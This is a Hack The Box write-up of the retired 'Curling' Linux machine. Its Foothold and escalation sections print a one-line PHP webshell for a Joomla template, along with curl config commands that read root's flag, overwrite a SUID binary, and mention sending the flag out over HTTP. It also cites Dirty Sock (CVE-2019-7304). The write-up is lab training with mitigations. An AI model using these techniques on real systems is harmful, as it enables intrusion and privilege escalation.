---
machine: Curling
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, joomla, cron, curl, dirty-sock, privesc]
---

# Curling — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A layered compressed backup reveals the Joomla administrator password. The panel edits a template and yields a `www-data` webshell; the same backup gives `floris`'s password. A root cron runs `curl -K` on a controlled file: read the flag and write a SUID binary. The alternative is Dirty Sock (CVE-2019-7304).

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` Apache with Joomla.
- `gobuster` finds `/administrator/`, `/images/` and a backup directory.
- The Joomla version and template are old.

## Enumeration

- The backup is compressed several times (bz2, gz and tar).
- Decompressing it yields `password.txt` with the Joomla administrator password.
- The same password is reused for `floris` on the system.

```bash
bzip2 -d password_backup.bz2
gzip -d password_backup.gz
tar xf password_backup.tar
```

## Foothold

In the Joomla panel, edit a PHP template and write a webshell. The shell runs as `www-data`; `floris`'s password allows `su` and reading `user.txt`.

```bash
# Edit templates/<template>/error.php and add:
<?php system($_GET['cmd']); ?>
```

## Lateral movement

`pspy` shows a root cron running `curl -K /home/floris/admin-area/input -o report`. The `input` file is writable by `floris`, so curl options are controlled.

```bash
printf 'url = "file:///root/root.txt"\noutput = /tmp/root.txt\n' > /home/floris/admin-area/input
```

## Privilege escalation

For a shell, compile a binary that calls `setuid(0)` and write it as root using curl's `output` option over an existing SUID binary. `data = @/root/root.txt` can also exfiltrate the flag over HTTP.

```bash
gcc -o /tmp/rootbash rootbash.c
printf 'url = "file:///tmp/rootbash"\noutput = /usr/local/bin/<SUID_BINARY>\n' > input
```

The alternative is Dirty Sock (CVE-2019-7304) against `snapd`, which creates the `dirty_sock` user with administrative rights.

## Evidence

- Multi-layer backup and Joomla password.
- Webshell in a template.
- Reused `floris` password.
- `curl -K` cron and writable option file.
- Flag read and SUID binary, or Dirty Sock.

## Lessons learned

- Password backups must not sit in the webroot or be reused.
- An editable template is PHP code execution.
- `curl -K` accepts a config file with `output` and `data`, giving root read and write.
- Old snap services can be a local escalation.

## Mitigation and detection

- Move backups out of the webroot and use unique passwords.
- Restrict template editing and `/administrator/` access.
- Do not run `curl` as root on user files; use absolute paths and least privilege.
- Update `snapd` and review local user creation.

## References

- [0xdf — Curling](https://0xdf.gitlab.io/2019/03/30/htb-curling.html)
- [IppSec — Curling](https://www.youtube.com/watch?v=Paajc2Dupms)
- [Hack The Box — Curling](https://app.hackthebox.com/machines/curling)
